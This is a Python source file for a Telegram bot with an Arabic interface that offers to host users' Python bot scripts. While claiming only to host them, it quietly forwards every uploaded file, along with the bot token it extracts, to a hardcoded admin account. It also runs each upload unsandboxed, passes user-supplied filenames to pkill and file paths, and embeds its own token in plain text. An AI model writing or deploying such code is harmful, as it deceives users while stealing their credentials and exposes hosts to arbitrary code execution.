import telebot
from telebot import types
import subprocess
import os
import re

TOKEN = '6577144269:AAE9MboIQyC2DsCe3jKrVXIMGrJ9qTWu67k'
bot = telebot.TeleBot(TOKEN)

bot_script_name = None
admin_id = '6454550864' #ايديك

upload_buttons = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    upload_button = types.InlineKeyboardButton("رفع ملف 📤", callback_data='upload')
    status_button = types.InlineKeyboardButton("حالة البوت 🎗", callback_data='status')
    markup.row(upload_button, status_button)
    bot.send_message(message.chat.id, "مرحبا! بك في بوت رفع ملفات بايثون على استضافة \n\n※ يمكنك رفع حتى 4 ملفات \n※ يتم تشغيل الملفات المرفوعه على سيرفر بايثون \n※ لا ترفع ملفات مشبوهه حتى لا يتم حظرك من البوت \n※ لرفع ملف اضغط على زر *رفع ملف*📤", reply_markup=markup)

@bot.message_handler(commands=['developer'])
def developer(message):
    markup = types.InlineKeyboardMarkup()
    wevy = types.InlineKeyboardButton("مطور البوت 👨‍🔧", url='https://t.me/up_sz')
    markup.add(wevy)
    bot.send_message(message.chat.id, "للتواصل مع مطور البوت، اضغط على الزر أدناه:", reply_markup=markup)

@bot.message_handler(content_types=['document'])
def handle_file(message):
    global bot_script_name
    try:
        file_id = message.document.file_id
        if file_id not in upload_buttons:
            upload_buttons[file_id] = types.InlineKeyboardButton(f"ملف {len(upload_buttons)+1}", callback_data=file_id)
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        bot_script_name = message.document.file_name
        with open(bot_script_name, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot_token = get_bot_token(bot_script_name)
        bot.reply_to(message, f"تم رفع ملف بوتك بنجاح ✅\n\nاسم الملف المرفوع: {bot_script_name}\nتوكن البوت المرفوع: {bot_token}\n\nيمكنك التحكم في الملف باستخدام الأزرار الموجودة.")
        send_to_admin(bot_script_name)
        install_and_run_uploaded_file()
    except Exception as e:
        bot.reply_to(message, f"حدث خطأ : {e}")

def send_to_admin(file_name):
    try:
        with open(file_name, 'rb') as file:
            bot.send_document(admin_id, file)
    except Exception as e:
        print(f"Error sending file to admin: {e}")

def install_and_run_uploaded_file():
    try:
        subprocess.Popen(['pip', 'install', '-r', 'requirements.txt'])
        subprocess.Popen(['/usr/bin/python3', bot_script_name])
    except Exception as e:
        print(f"Error installing and running uploaded file: {e}")

def get_bot_token(file_name):
    try:
        with open(file_name, 'r') as file:
            content = file.read()
            match = re.search(r'TOKEN\s*=\s*[\'"]([^\'"]*)[\'"]', content)
            if match:
                return match.group(1)
            else:
                return "تعذر العثور على التوكن"
    except Exception as e:
        print(f"Error getting bot token: {e}")
        return "تعذر العثور على التوكن"

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'delete':
        try:
            os.remove(bot_script_name)
            bot.send_message(call.message.chat.id, "تم حذف ملف البوت بنجاح.")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"حدث خطأ: {e}")
    elif call.data == 'stop':
        try:
            stop_bot()
            bot.send_message(call.message.chat.id, "تم إيقاف البوت بنجاح.")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"حدث خطأ: {e}")
    elif call.data == 'upload':
        bot.send_message(call.message.chat.id, "ارسل الملف الذي تريد رفعه على الاستضافة.")
    elif call.data in upload_buttons:
        bot.send_message(call.message.chat.id, f"تم رفع ملف بوتك بنجاح ✅\n※ اسم الملف {upload_buttons[call.data].text}.")

def stop_bot():
    try:
        subprocess.Popen(['pkill', '-f', bot_script_name])
    except Exception as e:
        print(f"Error stopping bot: {e}")

def check_status(message):
    if os.path.exists(bot_script_name):
        markup = types.InlineKeyboardMarkup()
        delete_button = types.InlineKeyboardButton("حذف الملف 🗑", callback_data='delete')
        stop_button = types.InlineKeyboardButton("إيقاف تشغيل الملف 🔴", callback_data='stop')
        markup.row(delete_button, stop_button)
        bot.send_message(message.chat.id, "مرحباً بك في قائمة التحكم في ملفك التي رفعته على السيرفر \n\n※ تحكم من الازرار الموجوده بالاسفل", reply_markup=markup)
    else:
        bot.send_message(message.chat.id, "البوت غير مشغل.")

bot.polling()
